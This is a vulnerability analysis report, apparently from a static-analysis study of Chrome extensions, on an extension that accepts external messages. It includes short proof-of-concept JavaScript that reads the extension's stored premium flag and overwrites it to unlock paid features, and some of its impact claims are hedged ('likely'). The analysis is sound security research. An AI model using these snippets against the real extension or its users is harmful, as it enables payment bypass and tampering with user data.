# CoCo Analysis: mlbkjbnjjpeamiifcknkgealkfpehnoa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**

```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mlbkjbnjjpeamiifcknkgealkfpehnoa/opgen_generated_files/bg.js
Line 965 (minified code showing the flow)
```

**Code:**

```javascript
// Background script - External message listener (bg.js line 965)
chrome.runtime.onMessageExternal.addListener((function(e, t, n) {
    // Check if message has evt property and is "getStatus"
    void 0 !== e.evt && "getStatus" == e.evt &&
    chrome.storage.sync.get(["premium"], (function(e) {
        const t = void 0 !== e.premium && e.premium;
        n(t)  // ← Sends storage data back to external caller via sendResponse
    }))
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on tiktok.com or nopart2.com (whitelisted in externally_connectable):
chrome.runtime.sendMessage(
    'mlbkjbnjjpeamiifcknkgealkfpehnoa',  // Extension ID
    { evt: 'getStatus' },
    function(response) {
        console.log('Premium status:', response);  // Receives true/false
    }
);
```

**Impact:** Information disclosure. External websites (tiktok.com and nopart2.com) can query the user's premium subscription status stored in the extension. While this only exposes a boolean premium flag (not highly sensitive), it still represents unauthorized access to user data stored by the extension.

---

## Sink 2: bg_external_port_onMessage → chrome_storage_sync_set_sink

**CoCo Trace:**

```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mlbkjbnjjpeamiifcknkgealkfpehnoa/opgen_generated_files/bg.js
Line 965 (minified code showing the flow)
```

**Code:**

```javascript
// Background script - External port listener (bg.js line 965)
let n = null;  // Internal port reference

// Internal port (from content script)
chrome.runtime.onConnect.addListener((function(e) {
    n = e;  // Store reference to internal port
    // ... handles internal messages ...
}));

// External port (from external website/extension) - Entry point
chrome.runtime.onConnectExternal.addListener((function(e) {
    e.onMessage.addListener((function(e) {  // ← attacker-controlled message
        if (void 0 !== e.evt) switch (e.evt) {
            case "status":
                chrome.storage.sync.set(
                    {premium: e.is_premium},  // ← attacker-controlled data to storage
                    (function() {
                        n && n.postMessage({
                            evt: "status",
                            premium: e.is_premium  // ← Sends poisoned data to internal port
                        })
                    })
                )
        }
    }))
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Port Messages (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From a webpage on tiktok.com or nopart2.com (whitelisted in externally_connectable):
var port = chrome.runtime.connect('mlbkjbnjjpeamiifcknkgealkfpehnoa');

// Set premium status to true (grant fake premium access)
port.postMessage({
    evt: 'status',
    is_premium: true  // ← attacker sets this to true to gain premium features
});

// The extension will:
// 1. Store { premium: true } in chrome.storage.sync
// 2. Notify content script via internal port
// 3. Content script likely enables premium features based on this flag
```

**Impact:** Storage poisoning with complete exploitation chain. External websites can:
1. Set arbitrary premium status in storage
2. The poisoned value is immediately propagated to the content script via internal port
3. The content script likely grants premium features based on this flag, allowing attackers to bypass payment requirements and access premium functionality without authorization

This is a complete attack chain: attacker-controlled input → storage.set → immediate readback → propagation to content script that likely uses the value to control premium features.

---

## Notes

Both vulnerabilities stem from the extension's use of `chrome.runtime.onMessageExternal` and `chrome.runtime.onConnectExternal` without proper validation or origin checks. While `manifest.json` restricts external communication to `*.tiktok.com` and `*.nopart2.com` via `externally_connectable`, the methodology instructs us to IGNORE manifest restrictions - if even ONE domain can exploit these flows, they are TRUE POSITIVES. In this case, any webpage on the whitelisted domains can exploit both vulnerabilities.
